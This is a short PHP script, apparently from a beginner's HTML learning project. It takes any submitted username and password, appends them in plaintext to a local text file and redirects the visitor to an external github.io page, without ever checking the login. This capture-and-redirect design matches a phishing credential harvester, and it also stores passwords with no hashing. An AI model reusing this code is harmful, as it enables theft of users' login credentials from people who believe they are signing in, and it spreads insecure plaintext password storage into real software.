<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";

    $file = fopen("C:/Users/SERVER/Documents/Belajar HTML/login_data.txt", "a");

    fwrite($file, $data);

    fclose($file);

    header("Location: https://rizzzky.github.io/HTML/index.html");
    exit();
}
?>
